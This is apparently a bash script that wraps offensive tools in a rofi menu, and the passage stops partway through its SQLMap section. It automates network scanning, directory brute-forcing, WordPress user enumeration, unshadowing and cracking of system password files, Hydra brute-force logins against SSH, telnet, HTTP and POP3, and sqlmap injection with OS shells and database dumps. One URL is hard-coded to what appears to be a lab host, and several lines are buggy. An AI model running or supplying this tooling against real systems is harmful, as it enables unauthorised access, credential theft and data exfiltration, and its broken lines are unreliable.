#!/bin/bash

while true; do
	syntax=$(echo -e "1.  Select IP\n2.  Nmap\n3.  Dirb\n4.  WPScan\n5.  Password Cracking\n6.  SQLMap\n7.  Reverse Shell\n8.  Null Sessions\n9.  Exit" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "What Program are you interested in?"| cut -d '.' -f 1)



##---------------------------------------------------##
##                     Select IP                     ##
##---------------------------------------------------##

	if [[ "$syntax" == "1" ]]; then
		IPOptions=$(echo -e "1.  Manual\n2.  Interface\n3.  Back" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "How do you want to select IP Address?"| cut -d '.' -f 1)
		if [[ "$IPOptions" == "1" ]]; then
			scan=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter IP


			");
		elif [[ "$IPOptions" == "2" ]]; then
			interface=$(ifconfig | cut -d ":" -f 1 | cut -d " " -f 1 | sed '/^$/d' | grep -v 'lo' | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which interface do you want to use?" )
			myip=$(ifconfig "$interface" | grep -win 'inet' | cut -d " " -f 10)
			range=$(ifconfig "$interface" | grep -win 'inet' | cut -d " " -f 10 | cut -d "." -f 1-3 | tr -d '\n' && echo ".0/24")
			while true; do
				whosup=$(nmap -sn -T5 -min-parallelism 100 "$range" | grep -v -E 'Host|done|Starting' | cut -d " " -f 5 | grep -vxF "$myip" | sed '/^$/d' )
				scan=$(echo "$whosup" | tr " " "\n" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "What IP would you like to use?")
				break
			done
		fi
		

##---------------------------------------------------##
##                     NMAP                          ##
##---------------------------------------------------##

	elif [[ $syntax == "2" ]]; then
		while true; do
			nmapscan=$(echo -e  "1. Stealth Scan\n2. Quick Scan\n3. Full Scan\n4. UDP Quick Scan\n5. Full Scan+\n6. Port Knocker\n7. Back\n8. Exit" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "What type of nmap scan would you like to use?" | cut -d '.' -f 1)

			if [[ $nmapscan == "1" ]]; then
				mkdir -p "$scan/NmapScans/StealthScan"
				sudo nmap -T1 -sS -vv "$scan" -oX  "$scan/NmapScans/StealthScan/$scan.xml"
				xsltproc "$scan/NmapScans/StealthScan/$scan.xml" -o "$scan/NmapScans/StealthScan/$scan.html"
				rm -f "$scan/NmapScans/StealthScan/$scan.xml"
				xdg-open "$scan/NmapScans/StealthScan/$scan.html" &
				grep -B 3 -E "(http|https)" $scan/NmapScans/StealthScan/$scan.html | grep -B 1 "tcp" | cut -d ">" -f "2" | cut -d "<" -f "1" | grep -v "tcp" | grep -v "-" > $scan/http_ports.txt
				sed -i 's/^80$//g' $scan/http_ports.txt
				while read i;
				do
					xdg-open "http:$scan:$i" &
				done <$scan/http_ports.txt


			elif [[ $nmapscan == "2" ]]; then
				mkdir -p "$scan/NmapScans/QuickScan"
				nmap -sC -sV -T4 "$scan" -oX  "$scan/NmapScans/QuickScan/$scan.xml"
				xsltproc "$scan/NmapScans/QuickScan/$scan.xml" -o "$scan/NmapScans/QuickScan/$scan.html"
				rm -f "$scan/NmapScans/QuickScan/$scan.xml"
				xdg-open "$scan/NmapScans/QuickScan/$scan.html" &
				grep -B 3 -E "(http|https)" $scan/NmapScans/QuickScan/$scan.html | grep -B 1 "tcp" | cut -d ">" -f "2" | cut -d "<" -f "1" | grep -v "tcp" | grep -v "-" > $scan/http_ports.txt
				sed -i 's/^80$//g' $scan/http_ports.txt
				while read i;
				do
					xdg-open "http:$scan:$i" &
				done <$scan/http_ports.txt


			elif [[ $nmapscan == "2" ]]; then
				mkdir -p "$scan/NmapScans/QuickScan"
				nmap -sC -sV -T4 "$scan" -oX  "$scan/NmapScans/QuickScan/$scan.xml"
				xsltproc "$scan/NmapScans/QuickScan/$scan.xml" -o "$scan/NmapScans/QuickScan/$scan.html"
				rm -f "$scan/NmapScans/QuickScan/$scan.xml"
				xdg-open "$scan/NmapScans/QuickScan/$scan.html" &
				grep -B 3 -E "(http|https)" $scan/NmapScans/QuickScan/$scan.html | grep -B 1 "tcp" | cut -d ">" -f "2" | cut -d "<" -f "1" | grep -v "tcp" | grep -v "-" > $scan/http_ports.txt
				sed -i 's/^80$//g' $scan/http_ports.txt
				while read i;
				do
					xdg-open "http:$scan:$i" &
				done <$scan/http_ports.txt


			elif [[ $nmapscan == "3" ]]; then
				mkdir -p "$scan/NmapScans/FullScan"
				nmap -sC -sV -p- "$scan" -oX  "$scan/NmapScans/FullScan/$scan.xml"
				xsltproc "$scan/NmapScans/FullScan/$scan.xml" -o "$scan/NmapScans/FullScan/$scan.html"
				rm -f "$scan/NmapScans/FullScan/$scan.xml"
				xdg-open "$scan/NmapScans/FullScan/$scan.html" &
				grep -B 3 -E "(http|https)" $scan/NmapScans/FullScan/$scan.html | grep -B 1 "tcp" | cut -d ">" -f "2" | cut -d "<" -f "1" | grep -v "tcp" | grep -v "-" > $scan/http_ports.txt
				sed -i 's/^80$//g' $scan/http_ports.txt
				while read i;
				do
					xdg-open "http:$scan:$i" &
				done <$scan/http_ports.txt


				

			elif [[ $nmapscan == "4" ]]; then
				mkdir -p "$scan/NmapScans/QuickUDP"
				sudo nmap -sU -sV -T4 "$scan" -oX  "$scan/NmapScans/QuickUDP/$scan.xml"
				xsltproc "$scan/NmapScans/QuickUDP/$scan.xml" -o "$scan/NmapScans/QuickUDP/$scan.html"
				rm -f "$scan/NmapScans/QuickUDP/$scan.xml"
				xdg-open "$scan/NmapScans/QuickUDP/$scan.html" &
				grep -B 3 -E "(http|https)" $scan/NmapScans/QuickUDP/$scan.html | grep -B 1 "tcp" | cut -d ">" -f "2" | cut -d "<" -f "1" | grep -v "tcp" | grep -v "-" > $scan/http_ports.txt
				sed -i 's/^80$//g' $scan/http_ports.txt
				while read i;
				do
					xdg-open "http:$scan:$i" &
				done <$scan/http_ports.txt


			elif [[ $nmapscan == "5" ]]; then
				mkdir -p "$scan/NmapScans/FullScan+"
				nmap -sV -n -v -Pn -p- -T4 -A "$scan" -oX "$scan/NmapScans/FullScan+/$scan.xml"
				xsltproc "$scan/NmapScans/FullScan+/$scan.xml" -o "$scan/NmapScans/FullScan+/$scan.html"
				rm -f "$scan/NmapScans/FullScan+/$scan.xml"
				xdg-open "$scan/NmapScans/FullScan+/$scan.html" &
				grep -B 3 -E "(http|https)" $scan/NmapScans/FullScan+/$scan.html | grep -B 1 "tcp" | cut -d ">" -f "2" | cut -d "<" -f "1" | grep -v "tcp" | grep -v "-" > $scan/http_ports.txt
				sed -i 's/^80$//g' $scan/http_ports.txt
				while read i;
				do
					xdg-open "http:$scan:$i" &
				done <$scan/http_ports.txt

			elif [[ $nmapscan == "6" ]]; then
				port=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Port Number

				");

				nmap -Pn --host-timeout 100 --max-retries 0 -p "$port" "$scan" 


			elif [[ $nmapscan == "7" ]]; then
				break
			elif [[ $nmapscan == "8" ]]; then
				exit   
			fi


		done



		
##---------------------------------------------------##
##                     Dirb                          ##
##---------------------------------------------------##

	elif [[ $syntax == "3" ]]; then
		while true; do
			dirb=$(echo -e "1.  Default Directory list\n2.  Choose a Directory List\n3.  Add File Extentions .php .old and .bak\n4.  Back\n5.  Exit" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which Dirb Command would you like to use?" | cut -d '.' -f 1)
			###Default Directory List
			if [[ $dirb == "1" ]]; then
				while read i;
				do
					dirb http://$scan:$i -w -o $scan/directory.txt
				done <$scan/http_ports.txt
				grep -e "+" -e "==>" $scan/directory.txt | awk -F 'http:' '{print $2}' > $scan/d.txt | mv $scan/d.txt $scan/directory.txt
				sed -i 's/\/\//http:\/\//g' $scan/directory.txt 
				sed -r -i -e 's/[(]CODE:.*[)]|SIZE:.*//g' $scan/directory.txt
				cat $scan/directory.txt

				###Choose Directory List
			elif [[ $dirb == "2" ]]; then
				dirlist=$(find /usr/share/dirb/wordlists/* /usr/share/dirbuster/wordlists/* -name '*.txt' | sort | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which Password List would you like to use?")
				while read i;
				do
					dirb http://$scan:$i $dirlist -w -o $scan/directory.txt
				done <$scan/http_ports.txt
				grep -e "+" -e "==>" $scan/directory.txt | awk -F 'http:' '{print $2}' > $scan/d.txt | mv $scan/d.txt $scan/directory.txt
				sed -i 's/\/\//http:\/\//g' $scan/directory.txt 
				sed -r -i -e 's/[(]CODE:.*[)]|SIZE:.*//g' $scan/directory.txt
				cat $scan/directory.txt
	

				##Add File Extention
			elif [[ $dirb == "3" ]]; then
				dirlist=$(find /usr/share/dirb/wordlists/* /usr/share/dirbuster/wordlists/* -name '*.txt' | sort | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which Password List would you like to use?")
				while read i;
				do
					dirb http://$scan:$i $dirlist -w -X '.php,.old,.bak' -o $scan/directory.txt
				done <$scan/http_ports.txt
				grep -e "+" -e "==>" $scan/directory.txt | awk -F 'http:' '{print $2}' > $scan/d.txt | mv $scan/d.txt $scan/directory.txt
				sed -i 's/\/\//http:\/\//g' $scan/directory.txt 
				sed -r -i -e 's/[(]CODE:.*[)]|SIZE:.*//g' $scan/directory.txt
				cat $scan/directory.txt


				##BACK
			elif [[ $dirb == "4" ]]; then
				break

				##EXIT
			elif [[ $dirb == "5" ]]; then
				exit
			fi
		done


##---------------------------------------------------##
##                      WPScan                       ##
##---------------------------------------------------##
	elif [[ $syntax == "4" ]]; then
		while true; do
			wpScan=$(echo -e "1. Enumerate Users\n2. Back\n3. Exit" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "What would you like WPScan to do?" | cut -d '.' -f 1)
			
			##----------------------------##
			##   WPScan Enumerate Users   ##
			##----------------------------##
			if [[ $wpScan == "1" ]]; then

				wpScan1Options=$(echo -e "1.  Manual\n2.  Dirb List\n3.  Back" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "How do you want to select Website?"| cut -d '.' -f 1)
				if [[ "$wpScan1Options" == "1" ]]; then
					url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter URL");

				elif [[ "$wpScan1Options" == "2" ]]; then
					url=$(cat $scan/directory.txt | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select URL From List" )

				fi

				wpscan --url $url --enumerate u

			##-----------------------------##
			##         WPScan Back         ##
			##-----------------------------##
			elif [[ $wpScan == "2" ]]; then
				break 2
						
			##-----------------------------##
			##         WPScan Exit         ##
			##-----------------------------##
			elif [[ $wpScan == "3" ]]; then
				exit   
			fi
		done

	
##---------------------------------------------------##
##               Password Cracking                   ##
##---------------------------------------------------##


	elif [[ $syntax == "5" ]]; then
		while true; do
			passcracker=$(echo -e "1. John\n2. Hydra\n3. Add Folders\n4. Back\n5. Exit" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which password cracking tool would you like to use?" | cut -d '.' -f 1)

			##----------------------------##
			##            John            ##
			##----------------------------##
			if [[ $passcracker == "1" ]]; then
				while true; do
					userlist=$(find /usr/share/ncrack/* /usr/share/seclists/Usernames/* ./Users/* -name '*.txt' -o -name '*.usr' | sort |rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which Username List would you like to use?")
					passlist=$(find /usr/share/ncrack/* /usr/share/seclists/Passwords/* ./Pass/* -name '*.txt' -o -name '*.usr' | sort | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which Password List would you like to use?")
					while true; do
						john=$(echo -e  "1.  Encryption Formats\n2.  Unshadow\n3.  Brute Force Users List\n4.  Brute Force Single User((Not Complete)\n5.  Show Cracked Passwords\n6.  Dictionary Attack\n7.  Default Wordlist\n8.  Mangled Rules\n9.  Crack Cisco Secret 5\n10. Change User & Pass List\n11. Back\n12. Exit" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which John The Ripper Attack would you like to use?" | cut -d '.' -f 1)

						if [[ $john == "1" ]]; then
							john --list=formats
						elif [[ $john == "2" ]]; then
							unshadow /etc/passwd /etc/shadow > hashes.txt
						elif [[ $john == "3" ]]; then
							john -incremental -users:"$userlist" -wordlist="$passlist"
						elif [[ $john == "4" ]]; then

							victim=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter a user(s) ex: User1, User2


							");
							john -incremental -users:"$victim"
						elif [[ $john == "5" ]]; then
							john --show hashes.txt
						elif [[ $john == "6" ]]; then
							john -wordlist="$passlist" hashes.txt
						elif [[ $john == "7" ]]; then
							victim=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter a user(s) ex: User1, User2


							");

							john -wordlist -users="$victim" hashes.txt
						elif [[ $john == "8" ]]; then
							john -wordlist="$passlist" -rules hashes.txt
						elif [[ $john == "9" ]]; then
							john --format=md5crypt --fork=4 -wordlist="$passlist" hashes.txt
						elif [[ $john == "10" ]]; then
							break	
						elif [[ $john == "11" ]]; then
							break 2
						elif [[ $john == "12" ]]; then
							exit   
						fi
					done
				done

			##-----------------------------##
			##           Hydra             ##
			##-----------------------------##
			elif [[ $passcracker == "2" ]]; then
				while true; do	
					userlist=$(find /usr/share/ncrack/* /usr/share/seclists/Usernames/* ./Users/* -name '*.txt' -o -name '*.usr' | sort | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which Username List would you like to use?")
					passlist=$(find /usr/share/ncrack/* /usr/share/seclists/Passwords/* ./Pass/* -name '*.txt' -o -name '*.usr' | sort | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which Password List would you like to use
					");
					##port=$(nmap -T5 -min-parallelism 100 -p- $scan | cut -d " " -f 1 | sed 's/[^0-9]*//g' | sed '/^$/d'| rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "What port would you like to use?" | cut -d '.' -f 1)

					while true; do	
						hydra=$(echo -e  "1. Telnet Crack\n2. HTTP Basic Auth Attack\n3. SSH Crack 2\n4. Web Login Crack\n5. PoP3 Crack\n6. Change User & Pass List\n7. Back\n8. Exit" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which Hydra Attack would you like to use?" | cut -d '.' -f 1)
						
						##-----------------------------##
						##        Hydra Telnet         ##
						##-----------------------------##
						if [[ $hydra == "1" ]]; then
							echo -e "hydra -L $userlist -P $passlist telnet://$scan\n"
							hydra -L "$userlist" -P "$passlist" -s"$port" telnet://"$scan"

													
						##-----------------------------##
						##      Hydra HTTP Basic       ##
						##-----------------------------##
						elif [[ $hydra == "2" ]]; then

							hydra2Options=$(echo -e "1.  Manual\n2.  Dirb List\n3.  Back" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "How do you want to select Website?"| cut -d '.' -f 1)
							if [[ "$hydra2Options" == "1" ]]; then
								url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter URL


								");


							elif [[ "$hydra2Options" == "2" ]]; then
								url=$(cat $scan/directory.txt | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select URL From List" )

							fi



							echo -e "hydra -L $userlist -P $passlist http-get://$url\n"
							hydra -L "$userlist" -P -s"$port" "$passlist" http-get://"$url"
						
						##-----------------------------##
						##        Hydra SSH            ##
						##-----------------------------##
						elif [[ $hydra == "3" ]]; then
							echo -e "hydra $scan ssh -L $userlist -P $passlist -f -V\n"
							hydra "$scan" ssh -s22 -L "$userlist" -P "$passlist" -f -V
						
						
						##-----------------------------##
						##        Hydra Web Login      ##
						##-----------------------------##
						elif [[ $hydra == "4" ]]; then
							hydra2Options=$(echo -e "1.  Manual\n2.  Dirb List\n3.  Back" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "How do you want to select Website?"| cut -d '.' -f 1)
							if [[ "$hydra2Options" == "1" ]]; then
								url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter URL


								");


							elif [[ "$hydra2Options" == "2" ]]; then
								url=$(cat $scan/directory.txt | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select URL From List" )

							fi

							rname=$(echo "$url" | cut -d "/" -f 3);
							fpath=$(echo "$url" | cut -d "/" -f 4-99);
	
							formQuestion=$(echo -e "1.  Manual\n2.  From List\n3.  Back" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "How do you want to select Website?"| cut -d '.' -f 1)
							if [[ "$formQuestion" == "1" ]]; then
								usrForm=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter User Form");
								passForm=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter Password Form");



							elif [[ "$formQuestion" == "2" ]]; then
								wget -q http://vtcsec/secret/wp-login.php -O $scan/FormPage
								cat $scan/FormPage | awk  -F 'name=' '{print $2}'| awk -F 'id=' '{print $1}' | sed 's/"//g' | sed '/^$/d' | awk 'NF==1' > $scan/fp

								#cat $scan/FormPage | grep -B 5 "type=\"password\"" | awk  -F 'id=' '{print $2}' | awk -F 'class' '{print $1}' | sed 's/"//g' | sed '/^$/d' | sed 's/ //g' > $scan/fp
								mv $scan/fp $scan/FormPage
								usrForm=$(cat $scan/FormPage | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select the User Form ID used")
								passForm=$(cat $scan/FormPage | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select the Password Form ID used")
								rm $scan/FormPage

							fi


							loginFail=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Login Fail Message"
							
							
							
							);


							echo -e "hydra $rname http-post-form /$fpath':$usrForm=^USER^&$passForm=^PASS^:$loginFail' -L $userlist -P $passlist -f -V\n"
							hydra "$rname" http-post-form '/$fpath:$usrForm=^USER^&$passForm=^PASS^&wp-submit=Log+In:$loginFail' -L "$userlist" -P "$passlist" -f -V

						
						##-----------------------------##
						##        Hydra Pop3           ##
						##-----------------------------##
						elif [[ $hydra == "5" ]]; then

							UserQuestion=$(echo -e  "Yes\nNo" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Do you know the Username?")
							if [[ $UserQuestion == "Yes" ]]; then 
								user=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter Username:


								");



								echo -e "hydra -l $user -P $passlist -t20 $scan -s$port -I pop3\n"
								hydra -l "$user" -P "$passlist" -t20 "$scan" -s"$port" -I pop3

							elif [[ $UserQuestion == "No" ]]; then 

								echo -e "hydra -L $userlist-P $passlist -t20 $scan -s$port -I pop3\n"
								hydra -L "$userlist" -P "$passlist" -t20 "$scan" -s"$port" -I pop3



							fi
						
						
						##-----------------------------##
						##        Change Lists         ##
						##-----------------------------##
						elif [[ $hydra == "6" ]]; then
							break

						##-----------------------------##
						##         Hydra Back          ##
						##-----------------------------##
						elif [[ $hydra == "7" ]]; then
							break 2
						
						##-----------------------------##
						##         Hydra Exit          ##
						##-----------------------------##
						elif [[ $hydra == "8" ]]; then
							exit   



						fi
					done
				done

			##-----------------------------##
			##         Add Folders         ##
			##-----------------------------##
			elif [[ $passcracker == "3" ]]; then
				mkdir Hash Pass Users


			##-----------------------------##
			##            Back             ##
			##-----------------------------##
			elif [[ $passcracker == "4" ]]; then
				break

			##-----------------------------##
			##           Exit              ##
			##-----------------------------##
			elif [[ $passcracker == "5" ]]; then
				exit   


			fi

		done	


##---------------------------------------------------##
##                  SQL Map                          ##
##---------------------------------------------------##


	elif [[ "$syntax" == "6" ]]; then
		while true; do
			sqlmaps=$(echo -e "1.  Interactive Shell\n2.  Get Request\n3.  Post Request\n4.  Banner Grab\n5.  Payloads Used\n6.  Find Users\n7.  Show Databases\n8.  Show Tables\n9.  Show Columns\n10. Dump Database\n11. Burp Output(NOT WORKING)\n12. Back\n13. Exit" | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Which SQLMap Command would you like to use?" | cut -d '.' -f 1)

				##Interactive Shell
				if [[ $sqlmaps == "1" ]]; then
					url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


					");

					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms --os-shell


				##Get Request	
			elif [[ $sqlmaps == "2" ]]; then
				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


				");
				index="="
				if grep -q "$index" <<< "$url"; then
					id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
					sqlmap --keep-alive --answers="follow=y" --batch  -u "$url" -p "$id" --technique=U

				else
					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms

				fi

				##Post Request	
			elif [[ $sqlmaps == "3" ]]; then
				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


				");
				index="="

				if grep -q "$index" <<< "$url"; then
					id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --data=POSTstring -p "$id"

				else
					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms --data=POSTstring 

				fi

				##Banner Grab	
			elif [[ $sqlmaps == "4" ]]; then
				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


				");
				index="="

				if grep -q "$index" <<< "$url"; then
					id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U --banner

				else
					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms --banner

				fi

				##Payloads Used
			elif [[ $sqlmaps == "5" ]]; then
				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


				");
				index="="

				if grep -q "$index" <<< "$url"; then
					id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U --banner -v3 --fresh-queries

				else
					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms --banner -v3 --fresh-queries

				fi


				##Find Users
			elif [[ $sqlmaps == "6" ]]; then
				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


				");
				index="="

				if grep -q "$index" <<< "$url"; then
					id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=u -users

				else
					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -users

				fi


				##Show Database
			elif [[ $sqlmaps == "7" ]]; then
				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


				");
				index="="

				if grep -q "$index" <<< "$url"; then
					id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=u -dbs

				else
					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -dbs

				fi


				##Show Tables
			elif [[ $sqlmaps == "8" ]]; then
				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


				");
				index="="

				if grep -q "$index" <<< "$url"; then
					id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
					db=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=u -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select Database use 

					");

					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U -D "$db" -tables

				else
					db=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select Database use 

					");

					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -D "$db" -tables



				fi

				##Show Columns
			elif [[ $sqlmaps == "9" ]]; then
				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


				");
				index="="

				if grep -q "$index" <<< "$url"; then
					id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1)
					db=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=u -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Database 

					");

					Tables=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U -D "$db" -tables | grep '+-' -A 50 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | grep -vE '([+]*[+])' | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Table

					");
					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U -D "$db" -T "$Tables" -columns
				else
					db=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Database 

					");

					Tables=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -D "$db" -tables | grep '+-' -A 50 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | grep -vE '([+]*[+])' | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Table

					");
					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -D "$db" -T "$Tables" -columns


				fi

				##Dump Databases
			elif [[ $sqlmaps == "10" ]]; then
				url=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Paste Your URL


				");
				index="="

				if grep -q "$index" <<< "$url"; then
					id=$(echo "$url" | cut -d "?" -f 2 | cut -d "=" -f 1) 
					db=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=u -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Database 

					");

					Tables=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U -D "$db" -tables | grep '+-' -A 50 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | greP -vE '([+]*[+])' | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Table	

					");


					Columns=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U -D "$db" -T "$Tables" --columns | grep '+-' -A 55 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | grep -vE '([+]*[+])' | tail -n +2)

					echo "$Columns"
					sleep 1

					Data=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter Columns to Dump


					$Columns	


					");


					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" -p "$id" --technique=U -D "$db" -T "$Tables" -C "$Data" --dump

				else
					db=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -dbs | grep "available databases" -A 99 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d ' ' -f 2 | tail -n +2 | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Database 

					");

					Tables=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -D "$db" -tables | grep '+-' -A 50 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | grep -vE '([+]*[+])' | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Select a Table	

					");


					Columns=$(sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -D "$db" -T "$Tables" --columns | grep '+-' -A 55 | grep -vE '([0-9][0-9]:[0-9][0-9]:[0-9][0-9])' | cut -d " " -f 2 | grep -vE '([+]*[+])' | tail -n +2)

					echo "$Columns"
					sleep 1

					Data=$(echo "" | rofi -dmenu -async-pre-read 0  -font "Fira Code Medium 20" -theme DarkBlue -lines 1 -p "Enter Columns to Dump:


					$Columns	


					");


					sqlmap --keep-alive --answers="follow=y" --batch -u "$url" --forms -D "$db" -T "$Tables" -C "$Data" --dump

				fi

				##Burp Output (NOT WORKING)
			elif [[ $sqlmaps == "11" ]]; then
				file=$(find ./* -name '*.txt' | sort | rofi -dmenu -async-pre-read 0 -theme DarkBlue -p "Choose the file you want to use: This should be file you made from a burp output page")
				sqlmap --keep-alive --answers="follow=y" --batch -r "$file" — dbs — level 3

				##BACK
			elif [[ $sqlmaps == "12" ]]; then
